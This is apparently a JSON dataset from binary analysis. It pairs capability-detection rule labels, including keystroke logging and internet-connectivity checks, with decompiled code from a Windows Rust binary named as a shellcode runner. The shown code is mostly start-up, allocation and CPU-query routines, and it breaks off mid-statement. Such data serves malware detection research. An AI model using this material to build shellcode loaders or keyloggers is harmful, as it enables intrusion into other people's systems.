{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong sym.pre_c_init(void)\n\n{\n    ulong uVar1;\n    int32_t *piVar2;\n    \n    *0x452008 = 0;\n    **0x44c9e0 = 1;\n    **0x44c9f0 = 1;\n    **0x44ca00 = 1;\n    **0x44c9d0 = 1;\n    if ((**0x44c8b0 == 0x5a4d) && (piVar2 = *0x44c8b0 + *(*0x44c8b0 + 0x1e),  *piVar2 == 0x4550)) {\n        if (*(piVar2 + 6) == 0x10b) {\n            *0x452008 = 0;\n            if (0xe < piVar2[0x1d]) {\n                *0x452008 = piVar2[0x3a] != 0;\n            }\n        }\n        else if ((*(piVar2 + 6) == 0x20b) && (*0x452008 = 0,  0xe < piVar2[0x21])) {\n            *0x452008 = piVar2[0x3e] != 0;\n        }\n    }\n    if (**0x44c9c0 == 0) {\n        sym.__set_app_type(1);\n    }\n    else {\n        sym.__set_app_type(2);\n    }\n    uVar1 = sym._encode_pointer(0xffffffffffffffff);\n    **0x44c940 = uVar1;\n    **0x44c930 = uVar1;\n    ***0x44c8e0 = **0x44c9a0;\n    sym._setargv();\n    if (**0x44c860 != 1) {\n        return 0;\n    }\n    sym.__mingw_setusermatherr(sym._matherr);\n    return 0;\n}\n",
        "token_count": 426
    },
    "dd548e48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(ulong *arg1)\n\n{\n    // core::ptr::drop_in_place<alloc::vec::Vec<u8>>::hdd548e486ecdcdb8\n    if (arg1[1] == 0) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n    return;\n}\n",
        "token_count": 161
    },
    "7f799a5f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_sysinfo::windows::processor::Processor_::h7f799a5f6dff1154(int64_t arg1)\n\n{\n    // core::ptr::drop_in_place<sysinfo::windows::processor::Processor>::h7f799a5f6dff1154\n    sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(arg1);\n    if (*(arg1 + 0x18) != 0) {\n        sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(arg1 + 0x18);\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h9f68a4721a6a073d(arg1 + 0x30);\n    }\n    sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(arg1 + 0x48);\n    if (*(arg1 + 0x68) == 0) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *(arg1 + 0x60));\n    return;\n}\n",
        "token_count": 338
    },
    "d973d379": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hd973d379aa2a4e99(ulong *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    ulong uStack64;\n    int64_t iStack56;\n    ulong uStack48;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::hd973d379aa2a4e99\n    uVar2 = arg2 + 1;\n    if (uVar2 != 0) {\n        iVar1 = arg1[1];\n        if (uVar2 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        uStack32 = 8;\n        if (iVar1 == 0) {\n            uStack32 = 0;\n        }\n        else {\n            iStack40 = iVar1 * 8;\n            uStack48 = *arg1;\n        }\n        sym.alloc::raw_vec::finish_grow::hf777b0884249325f\n                  (&iStack72, SUB168(ZEXT816(uVar3) * ZEXT816(8), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(8) >> 0x40, 0) == 0) << 3, &uStack48);\n        if (iStack72 == 0) {\n            *arg1 = uStack64;\n            arg1[1] = uVar3;\n            return;\n        }\n        if (iStack56 != 0) {\n            dbg.handle_alloc_error(uStack64);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 469
    },
    "b359fa64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401944)\n// WARNING: Removing unreachable block (ram,0x004016c8)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.shellcode_runner_classic_rs::main::hb359fa64790758db(void)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uchar auVar5 [16];\n    uchar *puVar6;\n    ulong uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint8_t uVar11;\n    char cVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    ulong uVar15;\n    uchar (*pauVar16) [16];\n    uchar (*pauVar17) [16];\n    uchar (*pauVar18) [16];\n    uchar (*pauVar19) [16];\n    int64_t *arg1;\n    int64_t *piVar20;\n    uint *puVar21;\n    uint32_t *puVar22;\n    uint32_t uVar23;\n    uchar (*arg1_00) [16];\n    uint32_t uVar24;\n    uint64_t uVar25;\n    uchar (*arg2) [16];\n    uchar (*pauVar26) [16];\n    char *pcVar27;\n    uchar (**ppauVar28) [16];\n    uchar (**ppauVar29) [16];\n    uchar (*pauVar30) [16];\n    uchar *puVar31;\n    uint32_t *puVar32;\n    int64_t *piVar33;\n    int64_t iVar34;\n    uint64_t uVar35;\n    uint32_t *puVar36;\n    uchar (*pauVar37) [16];\n    int64_t *piVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    int64_t *piVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    int64_t *piVar44;\n    bool bVar45;\n    uint32_t uVar46;\n    uint uVar47;\n    uint uVar48;\n    uint uVar49;\n    ulong var_8h;\n    ulong SRWLock;\n    ulong var_18h;\n    uint64_t in_stack_fffffffffffff9d8;\n    uchar (**ppauStack1520) [16];\n    uchar (*pauStack1512) [16];\n    uchar (*pauStack1496) [16];\n    ulong uStack1488;\n    uint32_t uStack1480;\n    uint32_t uStack1476;\n    uint32_t uStack1472;\n    uint uStack1468;\n    uint64_t uStack1464;\n    uchar (*pauStack1456) [16];\n    uchar auStack1448 [24];\n    uchar (*pauStack1424) [16];\n    uchar (*pauStack1416) [16];\n    ulong uStack1408;\n    uchar (*pauStack1400) [16];\n    uchar (*pauStack1392) [16];\n    uchar (*pauStack1384) [16];\n    uchar (*pauStack1376) [16];\n    uchar (*pauStack1368) [16];\n    uchar (*pauStack1360) [16];\n    uchar (*pauStack1352) [16];\n    uint uStack1344;\n    uint uStack1340;\n    uchar (*pauStack1328) [16];\n    uchar (*pauStack1320) [16];\n    uchar (*pauStack1312) [16];\n    uchar (*pauStack1304) [16];\n    uchar (*pauStack1296) [16];\n    uchar (*pauStack1288) [16];\n    uchar (*pauStack1272) [16];\n    code *pcStack1264;\n    uchar (*pauStack1248) [16];\n    uchar (*pauStack1240) [16];\n    uint32_t uStack1232;\n    uint32_t uStack1228;\n    uint32_t uStack1224;\n    uint32_t uStack1220;\n    uchar (*pauStack1216) [16];\n    char *pcStack1208;\n    uchar (*pauStack1200) [16];\n    uchar auStack1192 [4];\n    uint32_t uStack1188;\n    ulong uStack1184;\n    uchar auStack1176 [10];\n    unkbyte6 Stack1166;\n    uchar auStack1160 [16];\n    uchar (*pauStack1144) [16];\n    ulong uStack1136;\n    uchar (*pauStack1128) [16];\n    uchar *puStack1120;\n    uchar (*pauStack1104) [16];\n    uint8_t uStack952;\n    uint64_t uStack936;\n    uchar (*pauStack928) [16];\n    ulong uStack920;\n    uchar (*pauStack912) [16];\n    uchar auStack904 [9];\n    unkbyte7 Stack895;\n    uchar (*pauStack888) [16];\n    code *pcStack880;\n    uchar (*pauStack872) [16];\n    ulong uStack864;\n    uchar (*pauStack648) [16];\n    uchar (*pauStack640) [16];\n    uchar (*pauStack632) [16];\n    int32_t iStack620;\n    ulong uStack616;\n    uint uStack608;\n    uint uStack604;\n    uchar (*pauStack600) [16];\n    uchar (*pauStack584) [16];\n    ulong uStack576;\n    uchar (*pauStack568) [16];\n    uchar (*pauStack560) [16];\n    ulong uStack552;\n    uchar (*pauStack544) [16];\n    uchar auStack536 [16];\n    uchar auStack520 [16];\n    uchar auStack504 [24];\n    uchar auStack480 [112];\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uchar (*pauStack352) [16];\n    ulong uStack344;\n    uchar auStack336 [8];\n    uint32_t uStack328;\n    uint32_t uStack324;\n    ulong uStack320;\n    ulong uStack312;\n    ulong uStack304;\n    uchar (*pauStack296) [16];\n    int64_t iStack288;\n    ulong uStack280;\n    uchar (*pauStack272) [16];\n    int64_t iStack264;\n    uchar (*pauStack256) [16];\n    ulong uStack248;\n    int64_t iStack240;\n    ulong uStack232;\n    uchar (*pauStack224) [16];\n    int64_t iStack216;\n    uchar (*pauStack208) [16];\n    uchar auStack200 [16];\n    int64_t iStack184;\n    ulong uStack176;\n    uchar auStack168 [16];\n    uint8_t uStack100;\n    \n    // shellcode_runner_classic_rs::main::hb359fa64790758db\n    auStack1160 = 0x0;\n    _auStack1176 = 0x0;\n    _auStack1192 = 0x0;\n    sub.KERNEL32.dll_GetSystemInfo(0);\n    puVar22 = cpuid(0x80000000);\n    uVar46 = *puVar22;\n    if (0x80000003 < uVar46) {\n        uVar25 = 4;\n        iVar14 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                           (0x50, 4);\n        if (iVar14 != 0) {\n            uStack1480 = iVar14;\n            uStack1476 = iVar14 >> 0x20;\n            uStack1472 = 5;\n            uStack1468 = 0;\n            uVar35 = 0;\n            bVar45 = false;\n            uVar23 = 0x80000000;\n            while ((uStack1464 = uVar35,  !bVar45 && (uVar23 <= uVar46))) {\n                bVar45 = uVar23 >= uVar46;\n                if (uVar23 == 0) {\n                    puVar21 = cpuid_basic_info(0);\n                }\n                else if (uVar23 == 1) {\n                    puVar21 = cpuid_Version_info(1);\n                }\n                else if (uVar23 == 2) {\n                    puVar21 = cpuid_cache_tlb_info(2);\n                }\n                else if (uVar23 == 3) {\n                    puVar21 = cpuid_serial_info(3);\n                }\n                else if (uVar23 == 4) {\n                    puVar21 = cpuid_Deterministic_Cache_Parameters_info(4);\n                }\n                else if (uVar23 == 5) {\n                    puVar21 = cpuid_MONITOR_MWAIT_Features_info(5);\n                }\n                else if (uVar23 == 6) {\n                    puVar21 = cpuid_Thermal_Power_Management_info(6);\n                }\n                else if (uVar23 == 7) {\n                    puVar21 = cpuid_Extended_Feature_Enumeration_info(7);\n                }\n                else if (uVar23 == 9) {\n                    puVar21 = cpuid_Direct_Cache_Access_info(9);\n                }\n                else if (uVar23 == 10) {\n                    puVar21 = cpuid_Architectural_Performance_Monitoring_info(10);\n                }\n                else if (uVar23 == 0xb) {\n                    puVar21 = cpuid_Extended_Topology_info(0xb);\n                }\n                else if (uVar23 == 0xd) {\n                    puVar21 = cpuid_Processor_Extended_States_info(0xd);\n                }\n                else if (uVar23 == 0xf) {\n                    puVar21 = cpuid_Quality_of_Service_info(0xf);\n                }\n                else if (uVar23 == 0x80000002) {\n                    puVar21 = cpuid_brand_part1_info(0x80000002);\n                }\n                else if (uVar23 == 0x80000003) {\n                    puVar21 = cpuid_brand_part2_info(0x80000003);\n                }\n                else if (uVar23 == 0x80000004) {\n                    puVar21 = cpuid_brand_part3_info(0x80000004);\n                }\n                else {\n                    puVar21 = cpuid(uVar23);\n                }\n                uVar47 = *puVar21;\n                uVar48 = puVar21[1];\n                uVar24 = puVar21[2];\n                uVar49 = puVar21[3];\n                uVar25 = uVar24;\n                if (uVar35 == CONCAT44(uStack1468, uStack1472)) {\n                    sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h3d2282e923c20e55(&uStack1480, uVar35);\n                    iVar14 = CONCAT44(uStack1476, uStack1480);\n                    uVar25 = uVar35;\n                }\n                iVar34 = uStack1464 * 0x10;\n                *(iVar14 + iVar34) = uVar47;\n                *(iVar14 + 4 + iVar34) = uVar48;\n                *(iVar14 + 8 + iVar34) = uVar49;\n                *(iVar14 + 0xc + iVar34) = uVar24;\n                uVar35 = uStack1464 + 1;\n                uVar23 = uVar23 + (uVar23 < uVar46);\n            }\n            uVar15 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(0x30);\n            _auStack904 = CONCAT88(uVar25, uVar15);\n            pauStack888 = NULL;\n            puVar22 = CONCAT44(uStack1476, uStack1480);\n            puVar36 = puVar22 + uVar35 * 4;\n            iVar14 = 2;\n            uVar25 = 5;\n            bVar45 = false;\n            do {\n                puVar32 = puVar22;\n                if (!bVar45) {\n                    uVar35 = iVar14 - 1;\n                    if ((uVar25 <= uVar35) || (puVar36 - puVar22 >> 4 <= uVar35)) goto code_r0x0040186a;\n                    uVar25 = uVar25 - iVar14;\n                    puVar32 = puVar22 + uVar35 * 4 + 4;\n                }\n                if ((uVar25 == 0) || (puVar32 == puVar36)) goto code_r0x0040186a;\n                uVar25 = uVar25 - 1;\n                puVar22 = puVar32 + 4;\n                sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277\n                          (auStack904, *puVar32);\n                sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277\n                          (auStack904, puVar32[1]);\n                sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277\n                          (auStack904, puVar32[2]);\n                sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277\n                          (auStack904, puVar32[3]);\n                bVar45 = true;\n                iVar14 = 0;\n            } while( true );\n        }\n        iVar14 = 0x50;\n        goto code_r0x004044cf;\n    }\n    pauStack1496 = 0x1;\n    pauStack1512 = NULL;\n    pauVar16 = NULL;\n    goto code_r0x0040193d;\ncode_r0x0040186a:\n    for (pauVar26 = NULL;\n        (pauVar19 = pauStack888,  pauStack888 != pauVar26 &&\n        (pauVar19 = pauVar26,  (*pauVar26)[auStack904._0_8_] != '\\0')); pauVar26 = *pauVar26 + 1) {\n    }\n    pauVar16 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h57fd5448b2bb4284(auStack904, pauVar19);\n    dbg.from_utf8(&pauStack584, pauVar16, pauVar19);\n    pauStack1512 = pauStack568;\n    pauVar26 = uStack576;\n    if (pauStack584 == NULL) {\n        pauStack1496 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(pauStack568);\n        sym.memcpy(pauStack1496, pauVar26, pauStack1512);\n    }\n    else {\n        pauStack1496 = 0x1;\n        pauStack1512 = NULL;\n        pauVar16 = NULL;\n    }\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack904);\n    if ((CONCAT44(uStack1468, uStack1472) != 0) &&\n       (auVar5 = ZEXT816(CONCAT44(uStack1468, uStack1472)) * ZEXT816(0x10),  SUB168(auVar5 >> 0x40, 0) == 0)) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.347\n                  (CONCAT44(uStack1476, uStack1480), SUB168(auVar5, 0), 4);\n    }\ncode_r0x0040193d:\n    pauVar26 = NULL;\n    iVar14 = cpuid_basic_info(0);\n    uVar46 = *(iVar14 + 4);\n    uVar23 = *(iVar14 + 8);\n    uVar25 = uVar23;\n    uVar24 = *(iVar14 + 0xc);\n    uVar15 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(0x10);\n    _auStack904 = CONCAT88(uVar25, uVar15);\n    pauStack888 = NULL;\n    sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277(auStack904, uVar46);\n    sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277(auStack904, uVar23);\n    sym.sysinfo::windows::processor::get_vendor_id_and_brand::add_u32::h5e1df48342551277(auStack904, uVar24);\n    for (; (pauVar19 = pauStack888,  pauStack888 != pauVar26 &&\n           (pauVar19 = pauVar26,  (*pauVar26)[auStack904._0_8_] != '\\0')); pauVar26 = *pauVar26 + 1) {\n    }\n    pauVar17 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h57fd5448b2bb4284(auStack904, pauVar19);\n    dbg.from_utf8(&pauStack584, pauVar17, pauVar19);\n    pauVar26 = pauStack568;\n    if (pauStack584 != NULL) {\n        if (auStack1192._0_2_ < 0xf) {\n            pauVar26 = *(auStack1192._0_2_ * 8 + 0x44c510);\n        }\n        else {\n            pauVar26 = 0x7;\n        }\n    }\n    uStack1488 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(pauVar26);\n    sym.memcpy(uStack1488);\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack904);\n    pauVar19 = auStack1160._0_4_;\n    if (pauVar19 == NULL) {\n        pauVar18 = 0x4;\n    }\n    else {\n        iVar14 = pauVar19 * 0x18;\n        pauVar18 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                             (iVar14, 4);\n        if (pauVar18 == NULL) goto code_r0x004044cf;\n    }\n    uStack1480 = pauVar18;\n    uStack1476 = pauVar18 >> 0x20;\n    uStack1472 = auStack1160._0_4_;\n    uStack1468 = 0;\n    uStack1464 = 0;\n    uVar15 = 0;\n    iVar13 = sub.POWRPROF.dll_CallNtPowerInformation\n                       (0xb, 0, 0, pauVar18, in_stack_fffffffffffff9d8 & 0xffffffff00000000 | auStack1160._0_4_ * 0x18);\n    pauStack1424 = pauVar26;\n    pauStack1248 = pauVar17;\n    if (iVar13 == 0) {\n        uVar25 = pauVar19 * 0x18;\n        pauVar30 = uVar25 / 0x18;\n        uStack1408 = NULL;\n        pauVar17 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hec06fb58981cbb96(pauVar30, 0);\n        pauStack1400 = NULL;\n        pauVar26 = pauVar18;\n        pauStack1416 = pauVar17;\n        if (uStack1408 < pauVar30) {\n            if (pauVar30 < uStack1408 * 2) {\n                pauVar30 = uStack1408 * 2;\n            }\n            pauVar37 = 0x4;\n            if (0x4 < pauVar30) {\n                pauVar37 = pauVar30;\n            }\n            pauStack568 = 0x8;\n            if (uStack1408 == NULL) {\n                pauStack568 = NULL;\n            }\n            else {\n                uStack576 = uStack1408 * 8;\n                pauStack584 = pauVar17;\n            }\n            pauVar30 = auStack904;\n            sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                      (pauVar30, SUB168(ZEXT816(pauVar37) * ZEXT816(8), 0), \n                       (SUB168(ZEXT816(pauVar37) * ZEXT816(8) >> 0x40, 0) == 0) << 3, &pauStack584);\n            arg1_00 = stack0xfffffffffffffc80;\n            arg2 = pauStack888;\n            if (auStack904._0_8_ == 0) {\n                pauStack1416 = stack0xfffffffffffffc80;\n                arg1_00 = pauVar30;\n                arg2 = 0x8000000000000001;\n                pauVar17 = stack0xfffffffffffffc80;\n                uStack1408 = pauVar37;\n            }\n            sym._ZN5alloc7raw_vec14handle_reserve17h5bdf8892013f3606E.348(arg1_00, arg2);\n        }\n        for (; uVar25 != 0; uVar25 = uVar25 - 0x18) {\n            **pauVar17 = *(*pauVar26 + 8);\n            pauVar17 = *pauVar17 + 8;\n            pauVar26 = pauVar26[1] + 8;\n        }\n        pauStack1400 = pauVar19;\n        pauStack584 = pauVar18;\n        uStack576 = pauVar19;\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h6039529827829f96(&pauStack584);\n        pauStack1360 = pauStack1416;\n    }\n    else {\n        uStack1408 = CONCAT71(uVar15 >> 8, 1);\n        pauStack1416 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::hec06fb58981cbb96(pauVar19, uStack1408);\n        pauStack1400 = pauVar19;\n        pauStack1360 = pauStack1416;\n        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h6039529827829f96(&uStack1480);\n    }\n    uVar25 = auStack1160._0_4_;\n    iVar14 = (uVar25 + 1) * 0x88;\n    pauVar26 = 0x8;\n    pauStack1328 = pauVar19;\n    pauStack1240 = pauVar16;\n    pauVar19 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                         (iVar14, 8);\n    if (pauVar19 != NULL) {\n        pauStack1368 = NULL;\n        pauStack1392 = auStack1160._0_4_;\n        pauVar16 = NULL;\n        pauStack1384 = pauVar19;\n        pauStack1376 = uVar25 + 1;\n        for (pauVar17 = NULL; pauStack1392 != pauVar17; pauVar17 = *pauVar17 + 1) {\n            uStack1480 = pauVar17 + 1;\n            pauStack584 = 0x44c4a8;\n            uStack576 = 0x1;\n            pauStack568 = NULL;\n            _auStack904 = CONCAT88(0x408110, &uStack1480);\n            pauStack544 = 0x1;\n            uStack552 = auStack904;\n            sym.alloc::fmt::format::h5ed3f0bbcb495c5a(&pauStack1320, &pauStack584);\n            pauVar18 = pauStack1304;\n            pauVar26 = pauStack1320;\n            dbg.clone(&uStack1480, uStack1488, pauStack1424);\n            dbg.clone(auStack904, pauStack1496, pauStack1512);\n            if (pauVar17 == pauStack1328) {\n                uVar15 = 0x44c4b8;\n                pauVar26 = pauStack1328;\n                unique0x10005197 = pauStack1328;\n                goto code_r0x004043e4;\n            }\n            sym.sysinfo::windows::processor::Processor::new_with_values::hae24314455fd2f6f\n                      (&pauStack584, pauVar26, pauVar18, &uStack1480);\n            if (pauVar16 == pauStack1376) {\n                sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hfc1ddf983603ee55(&pauStack1384, pauVar16);\n                pauVar19 = pauStack1384;\n                pauVar16 = pauStack1368;\n            }\n            pauVar26 = &pauStack584;\n            sym.memcpy(pauVar16 * 0x88 + pauVar19, &pauStack584, 0x88);\n            pauVar16 = *pauVar16 + 1;\n            pauStack1368 = pauVar16;\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&pauStack1320);\n        }\n        pauStack568 = pauStack1368;\n        pauStack584 = pauStack1384;\n        uStack576 = pauStack1376;\n        if (uStack1408 != NULL) {\n            pauVar26 = SUB168(ZEXT816(uStack1408) * ZEXT816(8) >> 0x40, 0);\n            pauVar19 = SUB168(ZEXT816(uStack1408) * ZEXT816(8), 0);\n            if (pauVar26 == NULL) {\n                sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.347\n                          (pauStack1360, pauVar19, 8);\n                pauVar26 = pauVar19;\n            }\n        }\n        pauStack600 = pauStack568;\n        uStack616 = pauStack584;\n        uStack608 = uStack576;\n        uStack604 = uStack576._4_4_;\n        pauVar17 = sym._std::collections::hash::map::RandomState_as_core::default::Default_::default::hec455001f2d5f2fc\n                             ();\n        sym.hashbrown::raw::RawTableInner_A_::fallible_with_capacity::hcea2610e5ab85b25(&pauStack584, 0x118, 500);\n        pauVar16 = pauStack568;\n        pauVar19 = uStack576;\n        if (pauStack584 == NULL) {\n            _auStack1192 = CONCAT48(uStack552, pauStack560);\n            _auStack1192 = CONCAT412(uStack552._4_4_, _auStack1192);\n        }\n        uStack1480 = auStack1192;\n        uStack1476 = uStack1188;\n        uStack1472 = uStack1184;\n        uStack1468 = uStack1184._4_4_;\n        _auStack904 = CONCAT88(pauStack1248, uStack1488);\n        pauStack888 = pauStack1424;\n        pauStack584 = pauStack1496;\n        uStack576 = pauStack1240;\n        pauStack568 = pauStack1512;\n        sym.sysinfo::windows::processor::Processor::new_with_values::hae24314455fd2f6f\n                  (auStack1192, 0x44c298, 9, auStack904);\n        iVar14 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                           (0x110, 8);\n        if (iVar14 == 0) {\n            iVar14 = 0x110;\n        }\n        else {\n            pauStack584 = NULL;\n            pauStack224 = NULL;\n            iVar13 = sub.pdh.dll_PdhOpenQueryA(0);\n            if (iVar13 == 0) {\n                pauStack1424 = pauStack584;\n                uStack1488 = sym._std::collections::hash::map::RandomState_as_core::default::Default_::default::hec455001f2d5f2fc\n                                       ();\n                _auStack904 = 0x0;\n                pauStack1496 = 0x44bf50;\n                pauStack1392 = pauStack224;\n            }\n            else {\n                pauStack1496 = NULL;\n            }\n            uStack232 = sym._std::collections::hash::map::RandomState_as_core::default::Default_::default::hec455001f2d5f2fc\n                                  ();\n            pauStack584 = NULL;\n            (**0x443098)(&pauStack584);\n            if (pauStack584 < 0x19db1ded53e8000) {\n                iStack184 = 0;\n            }\n            else {\n                pauVar18 = pauStack584[-0x19db1ded53e800];\n                uVar25 = sub.KERNEL32.dll_GetTickCount64();\n                iStack184 = pauVar18 / 10000000 - uVar25 / 1000;\n            }\n            uVar46 = 0;\n            uVar47 = 0;\n            uVar48 = 0;\n            uVar49 = 0;\n            auStack168 = ZEXT816(0);\n            pauStack568 = pauVar19;\n            pauStack560 = pauVar16;\n            uStack552 = CONCAT44(uStack1476, uStack1480);\n            pauStack544 = CONCAT44(uStack1468, uStack1472);\n            auStack536 = ZEXT816(0);\n            auStack520 = ZEXT816(0);\n            puVar31 = auStack1192;\n            pauStack584 = pauVar17;\n            uStack576 = pauVar26;\n            sym.memcpy(auStack504);\n            uStack368 = uStack616;\n            uStack364 = uStack616._4_4_;\n            uStack360 = uStack608;\n            uStack356 = uStack604;\n            pauStack352 = pauStack600;\n            uStack344 = 8;\n            _auStack336 = CONCAT412(uVar49, CONCAT48(uVar48, CONCAT44(uVar47, uVar46)));\n            uStack312 = 2;\n            uStack304 = 0;\n            pauStack296 = pauStack1424;\n            iStack288 = 0;\n            uStack280 = uStack1488;\n            pauStack272 = pauStack1392;\n            iStack264 = 0;\n            pauStack256 = pauStack1496;\n            uStack248 = auStack904._0_8_;\n            iStack240 = stack0xfffffffffffffc80;\n            iStack216 = 0;\n            pauStack208 = 0x44bf50;\n            auStack200 = CONCAT412(uVar49, CONCAT48(uVar48, CONCAT44(uVar47, uVar46)));\n            uStack176 = 8;\n            uStack320 = iVar14;\n            if (iVar13 == 0) {\n                iStack620 = 0;\n                uStack936 = uStack936 & 0xffffffff00000000;\n                uVar15 = sym._std::collections::hash::map::RandomState_as_core::default::Default_::default::hec455001f2d5f2fc\n                                   (auStack904._0_8_);\n                auStack1448._0_16_ = CONCAT412(uVar49, CONCAT48(uVar48, CONCAT44(uVar47, uVar46)));\n                uStack1480 = uVar15;\n                uStack1476 = uVar15 >> 0x20;\n                uStack1472 = puVar31;\n                uStack1468 = puVar31 >> 0x20;\n                uStack1464 = 0;\n                pauStack1456 = 0x44bf50;\n                piVar44 = NULL;\n                pcStack1208 = \"Counter 009\";\n                sub.ADVAPI32.dll_RegQueryValueExA(0xffffffff80000004, \"Counter 009\", 0, &uStack936, 0, &iStack620);\n                pauVar26 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(iStack620);\n                pauVar19 = iStack620;\n                pcVar27 = \"Counter 009\";\n                pauStack1216 = pauVar26;\n                pauStack1200 = pauVar19;\n                sub.ADVAPI32.dll_RegQueryValueExA\n                          (0xffffffff80000004, \"Counter 009\", 0, &uStack936, pauVar26, &iStack620);\n                pauStack1368 = pauStack1368 & 0xffffffffffffff00;\n                pauStack1384 = pauVar26;\n                pauStack1376 = pauVar19;\n                iVar14 = 